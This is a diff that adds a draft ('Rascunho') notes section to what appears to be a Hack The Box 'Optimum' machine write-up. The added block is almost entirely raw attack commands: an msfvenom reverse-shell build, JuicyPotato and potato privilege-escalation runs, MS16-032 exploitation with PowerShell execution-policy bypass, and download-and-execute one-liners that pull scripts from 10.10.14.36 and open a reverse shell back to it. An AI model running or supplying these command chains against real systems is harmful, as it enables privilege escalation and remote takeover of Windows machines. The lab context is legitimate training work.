@@ -1476,3 +1476,48 @@ FLAG ROOT
 ![12.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-optimum/12.jpg)
 
 
+## Rascunho
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.36 LPORT=53 -f exe -o reverse.exe
+
+.\JuicyPotato.exe -l 1337 -p C:\Users\kostas\Desktop\reverse1.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
+
+
+
+.\potato.exe -ip 127.0.0.1 -cmd "C:\Users\kostas\Desktop\reverse1.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
+
+Invoke-MS16-032 "-NoProfile -ExecutionPolicy Bypass -Command whoami"
+
+
+# Follow this cmd to exploit MS16-032 to get admin and run shell.ps1(ATTACHMNT): 
+Invoke-MS16-032 "-NoProfile -ExecutionPolicy Bypass -Command whoami"
+# To get a reverse powershell, serve this ms16_032_intrd_mod.ps1 and Invoke-PowerShellTcp.ps1, 
+and use this download & exec oneliner: 
+
+C:\windows\sysnative\windowspowershell\v1.0\powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36:3001/ms16_032_intrd_mod.ps1');C:\windows\sysnative\windowspowershell\v1.0\powershell Invoke-MS16-032 "-NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36:3001/Invoke-PowerShellTcp.ps1');C:\windows\sysnative\windowspowershell\v1.0\powershell Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.36 -Port 3003"     
+
+C:\windows\sysnative\windowspowershell\v1.0\powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36:3001/ms16_032_intrd_mod.ps1');Invoke-MS16-032 "-NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36:3001/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.36 -Port 3003"     
+
+
+C:\Users\kostas\AppData\Local\Temp>C:\windows\sysnative\windowspowershell\v1.0\powershell "C:\Users\kostas\Desktop\Invoke-MS16032.ps1"
+
+C:\Users\kostas\AppData\Local\Temp>C:\windows\sysnative\windowspowershell\v1.0\powershell "C:\Users\kostas\AppData\Local\Temp\Invoke-MS16032.ps1"
+
+
+
+
+.\ms16_032_intrd_mod.ps1 "-NoProfile -ExecutionPolicy Bypass -Command .\shell.ps1"
+Invoke-MS16-032 "-NoProfile -ExecutionPolicy Bypass -Command .\shell.ps1"
+
+C:\windows\sysnative\windowspowershell\v1.0\powershell .\ms16_032_intrd_mod.ps1
+C:\windows\sysnative\windowspowershell\v1.0\powershell Invoke-MS16-032 "-NoProfile -ExecutionPolicy Bypass -Command .\shell.ps1"
+
+
+C:\windows\sysnative\windowspowershell\v1.0\powershell "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36:3001/ms16_032_intrd_mod.ps1')";"C:\windows\sysnative\windowspowershell\v1.0\powershell" Invoke-MS16-032 "-NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36:3001/Invoke-PowerShellTcp.ps1')";"C:\windows\sysnative\windowspowershell\v1.0\powershell Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.36 -Port 3003" "    
+
+
+
+C:\windows\sysnative\windowspowershell\v1.0\powershell -exec bypass .\shell.ps1
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36:3001/ms16_032_intrd_mod.ps1');Invoke-MS16-032 "-NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36:3001/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.36 -Port 3003"
+```
